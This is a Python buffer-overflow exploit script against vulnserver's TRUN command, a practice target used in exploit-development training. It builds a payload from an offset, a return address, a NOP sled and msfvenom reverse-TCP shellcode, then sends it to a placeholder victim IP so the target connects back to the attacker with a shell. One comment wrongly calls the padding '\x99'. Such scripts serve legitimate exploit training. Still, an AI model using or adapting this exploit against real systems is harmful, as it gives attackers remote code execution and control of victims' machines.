import sys
import socket

# Generating the shell code exploit using msfvenom
# msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP address> LPORT=<Port you are listening to> EXITFUNC=thread -f c -a x86 -b "\x00"
# OUTPUT EXAMPLE :
overflow = ("\xd9\xcc\xb8\x0d\x3b\xc7\xf7\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
            "\x52\x31\x46\x17\x83\xee\xfc\x03\x4b\x28\x25\x02\xaf\xa6\x2b"
            "\xed\x4f\x37\x4c\x67\xaa\x06\x4c\x13\xbf\x39\x7c\x57\xed\xb5"
            "\xf7\x35\x05\x4d\x75\x92\x2a\xe6\x30\xc4\x05\xf7\x69\x34\x04"
            "\x7b\x70\x69\xe6\x42\xbb\x7c\xe7\x83\xa6\x8d\xb5\x5c\xac\x20"
            "\x29\xe8\xf8\xf8\xc2\xa2\xed\x78\x37\x72\x0f\xa8\xe6\x08\x56"
            "\x6a\x09\xdc\xe2\x23\x11\x01\xce\xfa\xaa\xf1\xa4\xfc\x7a\xc8"
            "\x45\x52\x43\xe4\xb7\xaa\x84\xc3\x27\xd9\xfc\x37\xd5\xda\x3b"
            "\x45\x01\x6e\xdf\xed\xc2\xc8\x3b\x0f\x06\x8e\xc8\x03\xe3\xc4"
            "\x96\x07\xf2\x09\xad\x3c\x7f\xac\x61\xb5\x3b\x8b\xa5\x9d\x98"
            "\xb2\xfc\x7b\x4e\xca\x1e\x24\x2f\x6e\x55\xc9\x24\x03\x34\x86"
            "\x89\x2e\xc6\x56\x86\x39\xb5\x64\x09\x92\x51\xc5\xc2\x3c\xa6"
            "\x2a\xf9\xf9\x38\xd5\x02\xfa\x11\x12\x56\xaa\x09\xb3\xd7\x21"
            "\xc9\x3c\x02\xe5\x99\x92\xfd\x46\x49\x53\xae\x2e\x83\x5c\x91"
            "\x4f\xac\xb6\xba\xfa\x57\x51\x05\x52\x5d\xa3\xed\xa1\x61\xb2"
            "\xb1\x2c\x87\xde\x59\x79\x10\x77\xc3\x20\xea\xe6\x0c\xff\x97"
            "\x29\x86\x0c\x68\xe7\x6f\x78\x7a\x90\x9f\x37\x20\x37\x9f\xed"
            "\x4c\xdb\x32\x6a\x8c\x92\x2e\x25\xdb\xf3\x81\x3c\x89\xe9\xb8"
            "\x96\xaf\xf3\x5d\xd0\x6b\x28\x9e\xdf\x72\xbd\x9a\xfb\x64\x7b"
            "\x22\x40\xd0\xd3\x75\x1e\x8e\x95\x2f\xd0\x78\x4c\x83\xba\xec"
            "\x09\xef\x7c\x6a\x16\x3a\x0b\x92\xa7\x93\x4a\xad\x08\x74\x5b"
            "\xd6\x74\xe4\xa4\x0d\x3d\x04\x47\x87\x48\xad\xde\x42\xf1\xb0"
            "\xe0\xb9\x36\xcd\x62\x4b\xc7\x2a\x7a\x3e\xc2\x77\x3c\xd3\xbe"
            "\xe8\xa9\xd3\x6d\x08\xf8")
# This is the shell code which will execute when we will push it in our exploitable binary

# This is the number we get when we run pattern_offset.rb
# pattern_offset.rb -l 2003 -q 386F4337
offset_number = 2003

# Address of the pointer : Here for eg : 0x625011af
address = "\xaf\x11\x50\x62"
# notice the address is in reverse order because the x86 systme uses little endian format which means higher bit in lower order


shellcode = "A" * offset_number + address + ("\x90" * 32) + overflow
# Here ("\x99" * 32) acts as a padding : Actually it is a NOP (no operation instruction)

# Enter the port vulnserver is listening on
PORT = 9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("YOUR_VICTIMS_IP", PORT))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print("Some error in connecting to the vulnserver running")
    sys.exit()
